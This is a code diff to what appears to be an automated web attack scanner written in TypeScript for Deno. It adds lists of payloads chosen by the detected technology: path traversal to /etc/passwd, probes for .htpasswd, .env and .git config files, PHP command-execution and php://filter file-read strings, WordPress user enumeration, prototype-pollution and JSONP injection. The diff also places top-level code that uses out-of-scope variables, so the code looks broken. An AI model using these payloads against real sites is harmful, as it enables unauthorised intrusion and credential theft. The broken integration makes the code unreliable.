@@ -465,7 +465,53 @@ async function testCveTemplates(
 
   return { tested, confirmed, failed, details };
 }
+async function getTechAdaptivePayloads(
+  tech: Record<string, string>,
+  db: any,
+  targetId: string
+): Promise<Record<string, string[]>> {
+  const extra: Record<string, string[]> = {};
+  const server = (tech.server || "").toLowerCase();
+  const framework = (tech.framework || "").toLowerCase();
+  const cms = (tech.cms || "").toLowerCase();
 
+  // Apache-specific
+  if (server.includes("apache")) {
+    extra.path_traversal_apache = [
+      "/.htaccess", "/.htpasswd", "/server-status", "/server-info",
+      "/../../../etc/passwd", "/.git/config", "/.env",
+    ];
+  }
+  // PHP-specific
+  if (framework.includes("php") || server.includes("php")) {
+    extra.php_specific = [
+      "<?php system('id'); ?>", "?page=php://filter/convert.base64-encode/resource=index",
+      "?file=php://input", "?url=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
+    ];
+  }
+  // WordPress-specific
+  if (cms.includes("wordpress") || cms.includes("wp")) {
+    extra.wordpress_specific = [
+      "/wp-config.php", "/wp-admin/admin-ajax.php", "/?author=1",
+      "/wp-json/wp/v2/users", "/?p=1&preview=true",
+      "/wp-content/debug.log", "/?rest_route=/wp/v2/users",
+    ];
+  }
+  // Node/Express
+  if (framework.includes("express") || framework.includes("node")) {
+    extra.nodejs_specific = [
+      "/__proto__[polluted]=1", "/constructor/prototype/polluted=1",
+      "?callback=alert(1)", "?jsonp=alert(1)",  // JSONP
+    ];
+  }
+
+  return extra;
+}
+
+// Then in Deno.serve(), after tech fingerprinting:
+const techPayloads = await getTechAdaptivePayloads(tech, db, targetId);
+const COMBINED_GRAMMARS = { ...FUZZ_GRAMMARS, ...techPayloads };
+// Use COMBINED_GRAMMARS instead of FUZZ_GRAMMARS in Round 1
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
 
